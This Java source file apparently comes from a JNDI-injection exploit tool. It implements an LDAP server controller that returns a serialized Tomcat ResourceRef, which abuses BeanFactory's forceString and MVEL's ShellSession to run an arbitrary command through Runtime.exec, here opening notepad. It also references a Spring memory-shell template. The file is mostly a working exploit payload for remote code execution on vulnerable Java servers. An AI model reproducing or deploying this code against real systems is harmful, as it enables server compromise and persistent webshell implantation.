package com.feihong.ldap.controllers;

import com.feihong.ldap.exceptions.IncorrectParamsException;
import com.feihong.ldap.exceptions.UnSupportedPayloadTypeException;
import com.feihong.ldap.template.SpringMemshellTemplate;
import com.feihong.ldap.utils.Util;
import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;
import com.unboundid.ldap.sdk.Entry;
import com.unboundid.ldap.sdk.LDAPResult;
import com.unboundid.ldap.sdk.ResultCode;
import org.apache.naming.ResourceRef;

import javax.naming.StringRefAddr;

/*
ldap://x.x.x.x:1389/xstream

Ref: https://b1ue.cn/archives/529.html
 */

@LdapMapping(uri = { "/mvel" })
public class MVELController implements LdapController {

    @Override
    public void sendResult(InMemoryInterceptedSearchResult result, String base) throws Exception {
        System.out.println("[+] Sending LDAP ResourceRef result for " + base);

        Entry e = new Entry(base);
        e.addAttribute("javaClassName", "java.lang.String"); //could be any
        //prepare payload that exploits unsafe reflection in org.apache.naming.factory.BeanFactory
        ResourceRef ref = getResourceRefBytomcatMVEL();

        e.addAttribute("javaSerializedData", Util.serialize(ref));

        result.sendSearchEntry(e);
        result.setResult(new LDAPResult(0, ResultCode.SUCCESS));

        System.out.println("[+] Done Sending LDAP ResourceRef result");
    }

    @Override
    public void process(String base) throws UnSupportedPayloadTypeException, IncorrectParamsException {
    }

    private static ResourceRef getResourceRefBytomcatMVEL(){
        ResourceRef ref = new ResourceRef("org.mvel2.sh.ShellSession", null, "", "",
                true, "org.apache.naming.factory.BeanFactory", null);
        ref.add(new StringRefAddr("forceString", "a=exec"));
        ref.add(new StringRefAddr("a",
                "push Runtime.getRuntime().exec('notepad');"));
        return ref;
    }


    public static void main(String[] args) throws Exception {
        Class clazz = SpringMemshellTemplate.class;
        String classCode = Util.getClassCode(clazz);
        System.out.println(classCode);
    }
}
